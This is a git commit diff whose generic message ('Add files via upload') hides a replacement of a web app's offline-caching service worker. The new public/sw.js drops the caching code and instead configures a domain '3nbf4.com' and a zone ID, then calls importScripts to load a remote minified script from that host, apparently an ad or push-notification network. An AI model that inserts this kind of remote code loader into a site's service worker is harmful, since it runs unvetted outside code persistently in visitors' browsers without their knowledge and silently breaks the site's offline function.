f34a93dc0cf8c9ef57d322b0eeee6ede86f28195
Tamamun Niam <tamamunniam3@gmail.com>
2026-04-02 23:01:26 +0700

    Add files via upload

--- public/sw.js
+++ public/sw.js
@@ -1,41 +1,6 @@
-const CACHE_NAME = 'jeda-renung-v2'
-const urlsToCache = [
-  '/',
-  '/offline.html',
-]
-
-self.addEventListener('install', event => {
-  event.waitUntil(
-    caches.open(CACHE_NAME).then(cache => cache.addAll(urlsToCache))
-  )
-  self.skipWaiting()
-})
-
-self.addEventListener('activate', event => {
-  event.waitUntil(
-    caches.keys().then(cacheNames =>
-      Promise.all(
-        cacheNames.map(cacheName => {
-          if (cacheName !== CACHE_NAME) return caches.delete(cacheName)
-        })
-      )
-    ).then(() => self.clients.claim())
-  )
-})
-
-self.addEventListener('fetch', event => {
-  if (event.request.method !== 'GET') return
-
-  event.respondWith(
-    fetch(event.request)
-      .then(response => {
-        if (!response || response.status !== 200 || response.type !== 'basic') {
-          return response
-        }
-        const responseToCache = response.clone()
-        caches.open(CACHE_NAME).then(cache => cache.put(event.request, responseToCache))
-        return response
-      })
-      .catch(() => caches.match(event.request).then(cached => cached || caches.match('/offline.html')))
-  )
-})
+self.options = {
+    "domain": "3nbf4.com",
+    "zoneId": 10821781
+}
+self.lary = ""
+importScripts('https://3nbf4.com/act/files/service-worker.min.js?r=sw')
